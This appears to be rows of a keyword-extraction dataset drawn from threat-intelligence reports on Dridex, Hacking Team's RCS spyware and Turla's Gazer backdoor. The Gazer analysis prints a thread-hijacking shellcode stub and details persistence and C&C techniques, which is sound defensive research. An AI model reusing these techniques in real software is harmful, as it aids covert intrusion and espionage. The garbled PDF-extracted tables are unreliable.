[62] TWITTER. @Dridex BOT. 17 déc. 2015. URL : url [63] TWITTER. @Dridex BOT. 14 déc. 2015. URL : url [64] TWITTER. @Dridex BOT. 14 déc. 2015. URL : url [65] TWITTER. @Dridex BOT. 16 déc. 2015. URL : url 23 sur 24TLP:WHITE- 17/07/2020 Licence ouverte (Étalab - v2.0)AGENCE NATIONALE DE LA SÉCURITÉ DES SYSTÈMES D’INFORMATIONANSSI - 51 boulevard de la Tour-Maubourg, 75700 PARIS 07 SP www.cert.ssi.gouv.fr / cert-fr.cossi@ssi.gouv.fr ","{'phrases': ['exploit kits', 'phishing emails', 'CraP2P', 'Necurs', 'Cutwail', 'control', 'affiliates', 'link', 'the Dridex', 'Dridex loader', 'additional modules', 'Peer', 'Infrastructure', 'ISs', 'web injection', 'banking', 'Sites', 'the operators', 'Trans', 'money', 'case', 'May', 'ransomware', 'machines', 'servers', 'resilience', 'Evil Corp', 'use', 'Dridex Botnets', 'botnet IDs', 'distribution', 'operations'], 'target': 'exploit kits; phishing emails; CraP2P; Necurs; Cutwail; control; affiliates; link; the Dridex; Dridex loader; additional modules; Peer; Infrastructure; ISs; web injection; banking; Sites; the operators; Trans; money; case; May; ransomware; machines; servers; resilience; Evil Corp; use; Dridex Botnets; botnet IDs; distribution; operations.'}"
Hacking Team; Hacking Team; victim; the malware; the remote controller; RCS; files; IP; Command; t.; the remote system; the C2 server; addition; scripts; data; users; IP; addition; detection.,[' 1. Threat actors distribute spear phishing emails with PDF document attachments to targets. 2. The PDFs contain exploits that install the Hacking Team RCS spyware if opened. 3. The RCS implant connects to command and control servers controlled by the threat actors. 4. Threat actors use the RCS remote access capabilities to extract data from the infected system and network. '],"Extract the keywords: Our website uses cookies. By continuing to browse the site you are agreeing to our use of cookies. For moredetails about cookies and how to manage them, see our Cookie PolicyNews, views, and insight from the ESET security communityNew traces of Hacking Team in the wildType your keyword SearchBY FILIP KAFKA POSTED 9 MAR 2018 - 06:01PMPreviously unreported samples of Hacking Team’s infamous surveillance tool – the Remote Control System (RCS) – are in the wild, and have been detected by ESET systems in fourteen countries.Our analysis of the samples reveals evidence suggesting that Hacking Team’s developers themselves are actively continuing the development of this spyware. From Hacking Team to Hacked Team to…?Since being founded in 2003, the Italian spyware vendor Hacking Team gained notoriety for selling surveillance tools to governments and their agencies across the world.The capabilities of its ﬂagship product, the Remote Control System (RCS), include extracting ﬁles from a targeted device, intercepting emails and instant messaging, as well as remotely activating a device’s webcam and microphone. The company has been criticized for selling these capabilities to authoritarian governments – an allegation it has consistently denied.When the tables turned in July 2015, with Hacking Team itself suﬀering a damaging hack, the reported use of RCS by oppressive regimes was conﬁrmed. With 400GB of internal data – including the once-secret list of customers, internal communications, and spyware source code – leaked online, Hacking Team was forced to request its customers to suspend all use of RCS, and was left facing an uncertain future.Following the hack, the security community has been keeping a close eye on the company’s eﬀorts to get back on its feet. The ﬁrst reports suggesting Hacking Team’s resumed operations came six months later – a new sample of Hacking Team’s Mac spyware was apparently in the wild. A year after the breach, an investment by a company named Tablem Limited brought changes to Hacking Team’s shareholder structure, with Tablem Limited taking 20% of Hacking Team’s shareholding. Tablem Limited is oﬃcially based in Cyprus; however, recent news suggests it has ties to Saudi Arabia.Having just concluded our research into another commercial spyware product, FinFisher, two interesting events involving Hacking Team occurred in close succession – the report about Hacking Team’s apparent ﬁnancial recovery and our discovery of a new RCS variant in the wild with a valid digital certiﬁcate. The spyware lives onIn the early stages of this investigation, our friends from the Citizen Lab – who have a long record of keeping track of Hacking Team – provided us with valuable input that led to the discovery of a version of the spyware currently being used in the wild and signed with a previously unseen valid digital certiﬁcate.Our further research uncovered several more samples of Hacking Team’s spyware created after the 2015 hack, all being slightly modiﬁed compared to variants released before the source code leak.The samples were compiled between September 2015 and October 2017. We have deemed these compilation dates to be authentic, based on ESET telemetry data indicating the appearance of the samples in the wild within a few days of those dates.Further analysis led us to conclude that all the samples can be traced back to a single group, rather than being isolated instances of diverse actors building their own versions from the leaked Hacking Team source code.One indicator supporting this is the sequence of digital certiﬁcates used to sign the samples – we found six diﬀerent certiﬁcates issued in succession. Four of the certiﬁcates were issued by Thawte to four diﬀerent companies, and two are personal certiﬁcates issued to Valeriano Bedeschi (Hacking Team co-founder) and someone named Raﬀaele Carnacina, as shown in the following table:Certiﬁcate issued to Ziber LtdValidity period 8/13/2015 – 8/16/2016 9/11/2015 – 9/15/2016 6/8/2016 - 6/9/2017 6/20/2016 - 6/21/2017 8/29/2016 - 8/30/2017 7/9/2017 - 7/10/2018The samples also have forged Manifest metadata – used to masquerade as a legitimate apparently in an eﬀort to make their samples less prone to detection. This was also common among pre-leak Hacking Team spyware.The connections among these samples alone could have originated with virtually any group re- purposing the leaked Hacking Team source code or installer – as was the case with Callisto Group in early 2016. We have, however, collected further evidence that ties these post-leak samples to Hacking Team’s developers themselves.The versioning (which we accessed after overcoming VMProtect protection) observed in the analyzed samples continues where Hacking Team left oﬀ before the breach, and follows the same patterns. Hacking Team’s habit of compiling their payloads – named Scout and Soldier – consecutively, and often on the same day, can also be seen across the newer samples.The following table shows the compilation dates, versioning and certiﬁcate authorities of Hacking Team Windows spyware samples seen between 2014 and 2017. Reuse of leaked source code by Callisto Group is marked in red.Compilation date Scout version Soldier version Certiﬁcate issued to 2014-11-27 2014-12-05 2014-12-12 2015-03-19 2015-03-27Open Source Developer, Muhammad Lee's Open Source Developer, Muhammad Lee's Open Source Developer, meicun ge Open Source Developer, meicun ge Open Source Developer, meicun ge1008 1009100711 12132015-09-04 2015-10-19 2016-01-05 2016-01-18 2016-03-24 2016-06-17 2016-08-02 2016-09-0115 22JULY 2015 LEAK10111012 ADD AuditCompilation date Scout version Soldier version Certiﬁcate issued to 2016-12-19 2017-01-31 2017-04-28 2017-06-28 2017-10-09 2017-10-18ADD Audit ADD Audit ADD Audit, Media Lid Media Lid, Ziber Ltd 10221025Furthermore, our research has conﬁrmed that the changes introduced in the post-leak updates were made in line with Hacking Team’s own coding style and are often found in places indicating a deep familiarity with the code. It is highly improbable that some other actor – that is, other than the original Hacking Team developer(s) – would make changes in exactly these places when creating new versions from the leaked Hacking Team source code.One of the subtle diﬀerences we spotted between the pre-leak and the post-leak samples is the diﬀerence in Startup ﬁle size. Before the leak, the copied ﬁle was padded to occupy 4MB. In the post-leak samples, this ﬁle copy operation is padded to 6MB – most likely as a primitive detection evasion technique.Figure 1 – Startup ﬁle size copy changed from 4 MB pre-leak to 6MB post-leakWe found further diﬀerences that fully convinced us of Hacking Team’s involvement. However, the disclosure of these details could interfere with the future tracking of the group, which is why we choose not to publish them. We are, however, open to share these details with fellowresearchers (for any inquiries contact us at threatintel@eset.com).The functionality of the spyware largely overlaps with that in the leaked source code. Our analysis so far has not conﬁrmed the release of any signiﬁcant update, as promised by Hacking Team following the hack.As for the distribution vector of the post-leak samples we analyzed, at least in two cases, we detected the spyware in an executable ﬁle disguised as a PDF document (using multiple ﬁle extensions) attached to a spearphishing email. The names of the attached ﬁles contain strings likely aimed to reduce suspicion when received by diplomats.Figure 2 – Investigation timelineConclusionOur research lets us claim with high conﬁdence that, with one obvious exception, the post-leak samples we’ve analyzed are indeed the work of Hacking Team developers, and not the result of source code reuse by unrelated actors, such as in the case of Callisto Group in 2016.As of this writing, our systems have detected these new Hacking Team spyware samples in fourteen countries. We choose not to name the countries to prevent potentially incorrect attributions based on these detections, since the geo-location of the detections doesn’t necessarily reveal anything about the origin of the attack. IoCsESET detection names Trojan.Win32/CrisisHT.F Trojan.Win32/CrisisHT.H Trojan.Win32/CrisisHT.E Trojan.Win32/CrisisHT.L Trojan.Win32/CrisisHT.J Trojan.Win32/Agent.ZMW Trojan.Win32/Agent.ZMX Trojan.Win32/Agent.ZMY Trojan.Win32/Agent.ZMZSamples signed by Ziber Ltd Thumbprint: 14 56 d8 a0 0d 8b e9 63 e2 22 4d 84 5b 12 e5 08 4e a0 b7 07 Serial Number: 5e 15 20 5f 18 04 42 cc 6c 3c 0f 03 e1 a3 3d 9fSHA-1 samples Thumbprint: 3e 19 ad 16 4d c1 03 37 53 26 36 c3 7c a4 c5 97 64 6f bc c8 Serial Number: 4c 8e 3b 16 13 f7 35 42 f7 10 6f 27 20 94 eb 23SHA-1 samples Thumbprint: 17 f3 b5 e1 aa 0b 95 21 a8 94 9b 1c 69 a2 25 32 f2 b2 e1 f5 Serial Number: 2c e2 bd 0a d3 cf de 9e a7 3e ec 7c a3 04 00 daSHA-1 samplesSHA-1 samples Thumbprint: 6d e3 a1 9d 00 1f 02 24 c1 c3 8b de fa 74 6f f2 3a aa 43 75 Serial Number: 0f bc 30 db 12 7a 53 6c 34 d7 a0 fa 81 b4 81 93SHA-1 samples Thumbprint: 8a 85 4f 99 2a 5f 20 53 07 f8 2d 45 93 89 af da 86 de 6c 41 Serial Number: 08 44 8b d6 ee 91 05 ae 31 22 8e a5 fe 49 6f 63SHA-1 samples Thumbprint: 44 a0 f7 f5 39 fc 0c 8b f6 7b cd b7 db 44 e4 f1 4c 68 80 d0 Serial Number: 02 f1 75 66 ef 56 8d c0 6c 9a 37 9e a2 f4 fa eaSHA-1 samples Follow usSign up to our newsletterThe latest security news direct to your inboxEmail Submit ","{'phrases': ['spear', 'emails', 'PDF', 'the hack', 'Hacking Team', 'RCS', 'spyware', 'control', 'ties', 'data'], 'target': 'spear; emails; PDF; the hack; Hacking Team; RCS; spyware; control; ties; data.'}"
spearphishing; email; links; links; Data; the victim; the second stage backdoor; directories; commands; the malware; compromise; HTTPS; requests; the C&C server; data; commands; screenshots; the attacker; TTPs; detection.,"['1. A first stage malware like Skipper drops the Gazer payload on victims. 2. The Gazer loader injects the orchestrator module into explorer.exe. 3. The orchestrator decrypts config data and loads other modules from resources. 4. Modules gather recon data, steal browser files, spread via USB, etc. 5. The communication module injects into a browser process for internet access. 6. The C2 server sends encrypted commands which modules execute. 7. Data theft results are encrypted and exfiltrated back to the C2. 8. The C2 can push new modules, configurations, and tasks to infected hosts. ']","Extract the keywords: Gazing at GazerTurla’s new second stage backdoorAugust 2017Gazing at GazerTurla’s new second stage backdoorAugust 2017Table of ConTenTIntroduction Summary Similarities with other Turla tools Messages between componentsGazer versions C&C URLs 29lIST of fIGureSFigure 1. Figure 4.Turla author’s sense of humor Certificates used to sign the malware variantslIST of TableSTable 1. Table 6.Abstract Class Autorun Abstract Class Queue Abstract Class Storage Abstract Class TListenerInterface Abstract Class TAbstractTransport Gazer sample hashes6 Herein we release our analysis of a previously undocumented backdoor that has been targeted against embassies and consulates around the world leads us to attribute it, with high confidence, to the Turla group. Turla is a notorious group that has been targeting governments, government officials and diplomats for years. They are known to run watering hole and spearphishing campaigns to better pinpoint their targets. Although this backdoor has been actively deployed since at least 2016, it has not been documented anywhere. Based on strings found in the samples we analyzed, we have named this backdoor “Gazer”. Recently, the Turla APT group has seen extensive news coverage surrounding its campaigns, something we haven’t seen for a long time. The Intercept reported that there exists a 2011 presentation by Canada’s Communication Security Establishment (CSE) outlining the errors made by the Turla operators during their operations even though the tools they use are quite advanced. The codename for Turla APT group in this presentation is MAKERSMARK. Gazer is, similar to its siblings in the Turla family, using advanced methods to spy and persist on its targets. This whitepaper highlights the campaigns in which Gazer was used and also contains a technical analysis of its functionalities.Summary Based on our research and telemetry on the different campaigns where Gazer was used,we believe that Southeastern Europe as well as countries in the former Soviet Union Republichas recently been the main target. The witnessed techniques, tactics and procedures (TTPs) are in-line with what we usuallysee in Turla’s operation: a first stage backdoor, such as Skipper, likely delivered through spearphishingfollowed by the appearance on the compromised system of a second stage backdoor, Gazerin this case. Although we could not find irrefutable evidence that this backdoor is truly another tool in Turla’s arsenal, several clues lead us to believe that this is indeed the case. First, their targets are in line with Turla’s traditional targets: Ministries of Foreign Affairs (MFAs) and embassies. Second, the modus operandi of spearphishing, followed by a first stage backdoor and a second stage, stealthier backdoor is what has been seen over and over again. Skipper, which has been linked to Turla in the past, was found alongside Gazer in most cases we investigated. Finally, there are many similarities between Gazer and other second stage backdoors used by the Turla group such as Carbon and Kazuar. As usual, the Turla APT group makes an extra effort to avoid detection by wiping files securely, changing the strings and randomizing what could be simple markers through the different backdoor versions. In the most recent version we have found, Gazer authors modified most of the strings and inserted “video-game-related” sentences throughout the code. An example of such a string is depicted in Figure 1.5Figure 1.Turla author’s sense of humorSImIlarITIeS wITh oTher Turla ToolS Gazer is written in C++ and shares several similarities with other malware from the Turla APT family. Indeed, Gazer, Carbon and Kazuar can receive encrypted tasks from a C&C server, which can be executed either by the infected machine or by another machine on the network. They all use an encrypted container to store the malware’s components and configuration and they also log their actions in a file. The list of C&C servers is encrypted and embedded in Gazer’s PE resources. They are all compromised, legitimate websites (that mostly use the WordPress CMS) that act as a first layer proxy. This is also a common tactic for the Turla APT group. Another interesting linkage is that one of the C&C servers embedded in a Gazer sample was known to be used in a JScript backdoor documented by Kaspersky as Kopiluak. Last but not least, these three malware families (Gazer, Carbon and Kazuar) have a similar list of processes that may be employed as a target to inject the module used to communicate with the C&C server embedded in the binary. The resource containing this list can change from one sample to another, it is likely tailored to what is installed on the system (for example, on some samples, the process name “safari.exe” can appear on the list).CuSTom enCrypTIon Gazer’s authors make extensive use of encryption. They don’t use the Windows Crypto API and don’t seem to use any public library. It looks as if they are using their own library for 3DES and RSA. The RSA keys embedded in the resources contains the attacker’s public key which is used to encrypt the data sent to the C&C server, and a private key to decrypt resources embedded in its binaries. These keys are unique in each sample. These resources are structured in the same way as RSA from OpenSSL, but these values (p, q, etc.) are computed by the custom implementation of Gazer’s authors.6For 3DES, the IV and a static key are hardcoded and are the same in all samples. This 3DES key is randomly generated and XORed with the static key. The random data used to XOR the static key is prepended to the logfile header. This key is then used in the regular 3DES algorithm.Global arChITeCTure In this section, we will describe in detail each component of Gazer.GAZER LOADERGAZER ORCHESTRATORrsrc (cid:27)(cid:26)(cid:27)“explorer.exe”rsrc (cid:27)(cid:26)(cid:25)OrchestratorInjected into process indicated in rsrc (cid:141)(cid:143)(cid:141)running within “explorer.exe”rsrc (cid:27)(cid:26)(cid:27)(cid:24) (cid:22)rsrc (cid:27)(cid:26)(cid:25)Comm moduleMay forward taskMachines on the samenetwork …P‡PˆForward taskSendtask’s resultGAZER ORCHESTRATORrunning within“ﬁrefox.exe” (cid:31)for example(cid:20)Injected into a process that legitimately communicateover the internet.(cid:31)process list from rsrc (cid:18)(cid:17)(cid:16)(cid:15)Send tasks’resultsGet newtasksC&C serverFigure 2.Gazer architectureLoader The loader is the first component of the malware to be executed on the system. Two resources are stored unencrypted in the binary: • 101: the process name to inject the orchestrator into1 • 102: the orchestratorThe following mutex is created to ensure that only a single instance of the malware is running:{531511FA-190D-5D85-8A4A-279F2F592CC7}Named pipe generation To establish a communication channel between Gazer components, a named pipe is initiated. The named pipe is generated from this string:\\\\.\\pipe\\Winsock2\\CatalogChangeListener-FFFF-F1Note that in all samples we have analyzed the process name is “explorer.exe”7The pattern “FFFF-F” is replaced with values computed from the security identifier (SID) of the current user and the current timestamp. Let’s take for example the current date as: “2017/04/24” and the SID: “S-1-5-21-84813077- 3085987743-2510664113-1000”.To generate the pattern at the end of the named pipe, some arithmetic is performed:time = SystemTime.wDay * Systemtime.wMonth * SystemTime.wYear = 24 * 04 * 2017 = 0x2f460 xsid = (1 * 21 * 84813077 * 3085987743 * 2510664113 * 1000) & 0xFFFFFFFF = 0xefa252d8((time >> 20) + (time & 0xFFF) + ((time >> 12) & 0xFFF)) % 0xFF = 0x93 ((xsid >> 20) + (xsid & 0xFFF) + ((xsid >> 12) & 0xFFF)) % 0xFF = 0x13((time * xsid >> 24) + (uint8_t)(time * xsid) + ((uint16_t)(time * xsid) >> 8) + (uint8_t)(time * xsid >> 16)) % 0xf) = 0xaIn this case, the named pipe will be:\\\\.\\pipe\\Winsock2\\CatalogChangeListener-9313-aIf the current user’s SID cannot be retrieved, the named pipe \\\\.\\pipe\\\Winsock2\\ CatalogChangeListener-FFFE-D will be used by default.Code injection through thread hijacking A not-so-common trick is used in order to inject the orchestrator into a remote process. Indeed, a running thread from the remote process is hijacked in order to run shellcode that will execute the communication module entry point. • The whole module and shellcode are copied into the remote process; • the function ZwQuerySystemInformation is used to retrieve the total numberof the running threads in the targeted process;• the following operations are attempted on each of those threads:• the thread is suspended with the OpenThread/SuspendThread functions; • the thread context is retrieved using GetThreadContext; • the context’s instruction pointer is saved and modified to point to the shellcode(through SetThreadContext);• the thread is resumed using ResumeThread.• if one of the previous operations fails, the thread is resumed and the same actionsare attempted on another thread.8launcher:; @ end of payload ; lpStartAddress => @payloadpush rax sub rsp, 38h movabs rax, 5D20092 mov qword ptr ss:[rsp+28], rax mov qword ptr ss:[rsp+20], 0 xor r9d, r9d movabs r8, 5D20046 xor edx, edx xor ecx, ecx call qword ptr ds:[CreateThread] movabs rax, 90A7FACE90A7FACE add rsp, 38h xchg qword ptr ss:[rsp], rax ret; replaced by the saved instruction pointer from thread context ;)payload:sub rsp, 28 movabs r8, 5D20096 mov edx, 1 movabs rcx, 4000000000000000 call qword ptr ds: [DllEntryPoint] xor ecx, ecx xxxx ; TIDThe shellcode is just a loader that will execute the module entry point in a new thread.Persistence The loader sends binary data through the named pipe to the orchestrator. This blob contains: • a command ID (2): CMC_TAKE_LOADER_BODY • the loader path file • the loader PEOnce this message is received by the orchestrator, the loader is securely deleted by overwriting the file content and deleted through the DeleteFile function. Afterwards, the persistency is set up. The persistency information is retrieved from the resource “105” and stored in the Gazer storage. Among these data, there is a dword value that is used to choose which persistency mode will be applied.The resource 105 is structured in the following way: • a dword value representing the persistence mode • a dword value representing the size of the data • the persistence information9There are 6 different persistence modes.0: ShellAutorun Persistence is achieved through the Windows registry by setting the value “Shell” with “explorer. exe, %malware_pathfile%” under the following key: HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon1: HiddenTaskAutorun It is very similar to the “TaskScheduler Autorun (4)” method described below. The main difference is that the task is hidden from the user by using the TASK_FLAG_HIDDEN flag (set up via the SetFlags method from the ITask interface).2: ScreenSaverAutorun In this mode, Gazer achieves persistency by setting up in the Windows registry the executable file used for the screensaver. Many values are created under the HKCU\Control Panel\Desktop registry key: • SCRNSAVE.exe with the malware executable path • ScreenSaveActive is set to “1”: enable the screensaver • ScreenSaverIsSecure is set to “0”: specifies that the screensaver is not password-protected • ScreenSaveTimeout is set to a value given in the resource. It specifies how long the systemremains idle before the screensaver (in this case: the malware) starts.3: StartupAutorun If the resource 105 begins with the dword value “3”, a LNK file will be created in the Start Menu. The resource will also provide a description for the shortcut file, the path for the target and the filename for the LNK. The IShellLink interface is used to create the shell link.4: TaskSchedulerAutorun This method is used to achieve persistence by creating a scheduled task. The task is created and set up through COM interfaces related to tasks (ITaskService, ITaskSettings, … ). Some information such as the task name and its description is retrieved from the resource. For example, in one of the sample’s resources, the persistency mode is set to 04 (TaskSchedulerAutorun) with the persistency data:%APPDATA%\Adobe\adobeup.exe Adobe Acrobat Reader Updater. This task was generated by Adobe Systems, Inc to keep your Adobe Software up-to-data. \Adobe\AcrobatReader.AdobeIn this example, a scheduled task will be created and set up thus: • Task name: “Adobe Acrobat Reader Updater” • Executable: “%APPDATA%\Adobe\adobeup.exe”• The orchestrator will copy the loader received through the named pipe to this location10• Task description: “This task was generated by Adobe Systems, Inc to keep yourAdobe Software up-to-data”• Task folder: “\Adobe\AcrobatReader.Adobe”Last but not least, the task is configured to be started by the task scheduler at any time after its scheduled time has passed. The task will be triggered when the current user logs on.5: LinkAutorun This persistence method modifies existing LNK files to execute the malware through cmd.exe. For each LNK file in the folder given in the resource, the icon and arguments are removed and the path is set to “cmd.exe” with the argument set to:/q /c start “%s” && start “%s”In most of the samples we analyzed, the configuration file specified that the TaskSchedulerAutorun persistence method should be used.Logs All three Gazer components log their actions into logfiles. They are encrypted with the same algorithm: 3DES. In some versions of Gazer, it is easy to retrieve these logfiles because their filenames are hardcoded into the binaries: • %TEMP%\CVRG72B5.tmp.cvr: the logs from the loader • %TEMP%\CVRG1A6B.tmp.cvr: the logs from the orchestrator • %TEMP%\CVRG38D9.tmp.cvr: the logs from the communication moduleEach logfile is structured in the following way: • [LOGSIZE][DECRYPTION_KEY][ENCRYPTED_LOG]• logsize: when this value (2 bytes) is subtracted from the magic value 0xf18b, it givesthe encrypted log size• decryption_key: when this 12 bytes blob is XORed with another hardcoded key of 12 bytes,it gives the 3DES key that can be used to decrypt the log• encrypted_log: log encrypted with the 3DES algorithm in CBC modeOnce decrypted, each log entry is formatted in the following way: |Hour:Min:Sec:Ms| [log ID] [log]11Here is an example with the decrypted orchestrator logfile:******************[ ]**************** DATE: 25.05.2017 PID=900 TID=2324Heaps=32DLL_PROCESS_ATTACH Current thread = 2080 Heap aff0000 [34] Path = \HKCU\Software\Microsoft\\HKCU\Software\Microsoft\Windows\|10:29:56:197| [1556] |10:29:56:197| [1557] |10:29:56:197| [1558] |10:29:56:197| [1559] C:\Windows\Explorer.EXE |10:29:56:197| [1565] |10:29:56:197| [1574] |10:29:58:197| [0137] |10:29:58:197| [0138] |10:29:58:197| [0183] |10:29:58:197| [0189] |10:29:58:197| [0215] |10:29:58:197| [0246] |10:29:58:197| [1688] |10:29:58:197| [0279] Windows\CurrentVersion\Explorer\ScreenSaver |10:29:58:197| [0190] CurrentVersion\Explorer\ScreenSaver |10:29:58:197| [0338] ---FAILED Initializing standart reg storage |10:29:58:197| [0346] |10:29:58:197| [0190] Software\Microsoft\Windows\ CurrentVersion\Explorer\ScreenSaver |10:29:58:197| [2605] |10:29:58:197| [0392] |10:29:59:666| [1688] |10:29:59:713| [1473] |10:29:59:760| [1688] |10:29:59:775| [1473] |10:29:59:775| [1688] |10:29:59:775| [1473] |10:29:59:791| [1688] |10:29:59:791| [1473] |10:29:59:806| [1688] |10:29:59:806| [1473] |10:29:59:806| [0270] |10:29:59:806| [0286] |10:29:59:806| [0425] |10:29:59:806| [0463] 2510664113-1000 |10:29:59:806| [0471] |10:29:59:806| [0787] |10:29:59:806| [1473] |10:29:59:822| [0514] |10:29:59:822| [0370] |10:29:59:822| [0482] |10:29:59:822| [1754] |10:29:59:822| [1688] |10:29:59:822| [1473] |10:29:59:838| [0505] SZ_172 SC_0(50) --+- |10:29:59:838| [0625] |10:29:59:838| [0286] |10:29:59:838| [0425] |10:29:59:838| [0463] 2510664113-1000 |10:29:59:838| [0471] |10:29:59:838| [0165] CatalogChangeListener-2313-4 |10:29:59:838| [0131] CatalogChangeListener-2313-4 |10:29:59:838| [0041] [ ]Storage is empty! 08-00-27-90-05-2A _GETSID_METHOD_1_ 28 7 8 122 S-1-5-21-84813077-3085987743-Ok R #4294967295 PR_100 TR_00000000 28 7 25 122 S-1-5-21-84813077-3085987743-\\.\pipe\Winsock2\PipeName = \\.\pipe\Winsock2\true12Note that in older Gazer versions, the “log ID” was replaced by the name of the current function. We believe that this log ID is an ID for the function where the log occurs.Working DirectoryUsing the Windows Registry All the files related to Gazer (except the logs) are stored encrypted within the registry. The orchestrator’s resource “109” contains the root storage path (it will be designated %RootStoragePath% in the rest of this paper). In every sample we examined, this resource pointed to the same storage path:HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ScreenSaverIf this resource is empty, the registry key above is used by default. Except for RSA keys, all the data in the storage is encrypted2.Several subdirectories (whose names are hardcoded in the binary) are created. • %RootStoragePath%{119D263D-68FC-1942-3CA3-46B23FA652A0}• Object ID: a unique ID to identify the victim• %RootStoragePath%{1DC12691-2B24-2265-435D-735D3B118A70}• Task Queue: linked list of tasks to be executed• %RootStoragePath%{28E74BDA-4327-31B0-17B9-56A66A818C1D}• Plugins• %RootStoragePath%{31AC34A1-2DE2-36AC-1F6E-86F43772841F}• Communication Module: the DLL that communicates with the C&C server• %RootStoragePath%{3CDC155D-398A-646E-1021-23047D9B4366}• Autorun: the persistency method• %RootStoragePath%{4A3130BD-2608-730F-31A7-86D16CE66100}• Local Transport Settings: the computers IPs that are on the same network• %RootStoragePath%{56594FEA-5774-746D-4496-6361266C40D0}• Last Connection: last connection time with the C&C server (structure SYSTEMTIME)• %RootStoragePath%{629336E3-58D6-633B-5182-576588CF702A}• RSA Private Key: generated on the fly; used to decrypt the data from Gazer storage.• %RootStoragePath%{6CEE6FE1-10A2-4C33-7E7F-855A51733C77}• Result Queue: linked list of the tasks results• %RootStoragePath%{81A03BF8-60AA-4A56-253C-449121D61CAF}• Inject Settings: the list of processes to use to try to inject the communications module• %RootStoragePath%{8E9810C5-3014-4678-27EE-3B7A7AC346AF}• C&C servers2See the “Gazer Resources” section for details13Using Alternate Data Streams If it is not possible to access the registry, these configuration items are stored using alternate data streams. The function GetVolumeInformation is called to ensure that the volume “C:\” supports named streams in order to use ADS. The same GUIDs as above are used to hide the different data in an ADS for the file (hardcoded in the binary):“%TEMP%\KB943729.log”For example, here is the full path to access the object ID:%TEMP%\KB943729.log:{1DC12691-2B24-2265-435D-735D3B118A70}OrchestratorGazer Resources The Gazer-related files are stored in the orchestrator’s resources.File format There are a total of 11 resources (101 to 111) each structured in the following way: • [DATATYPE][SIZE][DATA][PADDING]• DATATYPE: A dword that specifies the type of data in the resource• 0x0: raw data • 0x1030001: strings array • 0x1: binary• SIZE: the size of the data (without padding)Encryption Except for resources 101 and 102 which are RSA keys, every resource is compressed with BZip and encrypted with 3DES. [RSAEncryptedBlob][SignatureBlob][3DESBlob]• RSAEncryptedBlob: The first 1024 bits of the data is a blob that contains a 3DES key. This blobis encrypted using RSA and can be decrypted using resource 101.• SignatureBlob: The second part of the data is a blob of 1024 bits containing the signatureof the last part of the data once decrypted.• 3DESBlob: The last part is the effective data, which is encrypted with the 3DES key fromthe first blob.Each resource is decrypted on the fly; the signature is compared with the decrypted data to check the integrity. Decrypted resources that pass this integrity check are encrypted with a new RSA key generated randomly by the orchestrator code. The private key and the encrypted resource are then stored in the registry under a specific GUID subkey.14Resources listing • 101: RSA private key. It is used to decrypt the other resources. • 102: an RSA public key. • 105: store the persistency information • 106: the list of processes to use to try to inject the communications module • 107: C&C communication DLL • 108: C&C server list • 109: Gazer working directory path • 110: plugins list • 111: local transport informationTask Execution When a task is retrieved from the C&C, it is either executed by the infected machine or by another computer on the same network through a P2P mechanism (in the same way this was done in Carbon and Snake). The task can be: • command executionThe result of the task is stored in a queue and forwarded to the module that communicates with the C&C server when access to the Internet is available.Classes Hierarchy The malware is written in C++ and the RTTI that contains information about the objects used in the code is not overwritten. There are 5 abstract classes that have several implementations.Table 1.Abstract Class AutorunClass Name HiddenTaskAutorun15Table 2.Abstract Class QueueClass Name TaskQueue ResultQueueTable 3.Abstract Class StorageClass Name RegStorageTable 4.Abstract Class TListenerInterfaceClass Name LTMessageProcessing CMessageProcessingSystemTable 5.Abstract Class TAbstractTransportClass Name The communication module is used to retrieve tasks from the C&C server and to dispatch them to the orchestrator. This library is injected into a process which can legitimately communicate over the Internet. The injection library is the same as the one found in the loader to inject the orchestrator into “explorer.exe”.Communication Initialization If a proxy server exists, it is retrieved and used by Gazer to make the HTTP requests. There are two different methods used to retrieve this value, either by requesting the following registry key:HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settingsor through the function InternetQueryOption with the flag INTERNET_OPTION_PROXY if the proxy server cannot be retrieved through the registry. The system user agent is then set up: • the default value of the “HKCU\Software\Microsoft\Windows\Current Version\Internet Settings\User Agent” key is retrieved;16• the value keys under “HKLM\Software\Microsoft\Windows\Current Version\InternetSettings\5.0\User Agent\Post Platform” are enumerated and those that contain the sub-string “IEAK” are concatenated with the user agent string from the previous step;• in the case that no user agent was found in the registry, the hardcoded UA Mozilla/4.0(compatible; MSIE 6.0) is usedBefore attempting any contact with the C&C server, the internet connection is checked by trying to reach the following servers one by one until one returns a HTTP status code 200: • update.microsoft.com • microsoft.com • windowsupdate.microsoft.com • yahoo.com • google.comC&C server communication The malware communicates with its C&C server to retrieve tasks (through HTTP GET requests) and to send the tasks results (through HTTP POST requests). Before sending a request to the C&C, the command CMC_GIVE_SETTINGS is sent to the orchestrator through its communication channel (a named pipe, more on this in the next section). The message (MSG) contained in the packet in this case is a single byte set by the orchestrator for the command result status. The orchestrator replies on the same channel with the settings retrieved from the working directory with the object id, the list of the C&C servers and the last connection date. A GET request is performed to retrieve a task from the C&C. The parameters of the GET request are chosen from amongst a hardcoded list of keywords that does not look suspicious. Their values are generated randomly in the charset [a-z0-9] with a random size from a range given for each parameter: • id [6-12] (As with all other parameters, if this parameter is used in the request, it will have a randomvalue (of letters and digits) with a random size between 6 and 12 characters.)• hash [10-15] • session [10-15] • photo [6-10] • video [6-10] • album [6-10] • client [5-10] • key [5-10] • account [6-12] • member [6-12] • partners [5-10] • adm [6-12] • author [6-12]17• contact [6-12] • content [6-12] • user [6-12]Here are few examples of such requests:xxx.php?album=2ildzq&key=hdr2a&partners=d2lic33f&session=nurvxd2x0z8bztz&video =sg508tujm&photo=4d4idgkxxx.php?photo=he29zms5fc&user=hvbc2a&author=xvfj5r0q 9c&client=7mvvc&partners=t4mgmuy&adm=lo3r6v4xxx.php?member=ectwzo820&contact =2qwi15&album=f1qzoxuef4&session=x0z8bztz8hrs65f&id=t3x0ftu9xxx.php?partners =ha9hz9sn12&hash=5740kptk3acmu&album=uef4nm5d&session=dpeb67ip65f&member=arj6 x3ljjxxx.php?video=nfqsz570&client=28c7lu2&partners=818eguh70&contact=ibj3xch &content=1udm9t799ixr&session=5fjjt61qred9uoA timeout of 10 minutes is set for each request (send/receive/connect) through InternetSetOption. Once the request is sent, the response is handled only if the returned HTTP status code is 404. The content of the response is encrypted and can be decrypted with the private RSA key generated by the orchestrator. The response body contains a blob of data and an MD5 hash of the data. The blob is hashed and compared to the MD5 to ensure the integrity of the server’s response. If the response size is 20 bytes (a blob of 4 bytes + the hash), there are no tasks to retrieve. A command CMC_TAKE_TASK is sent to 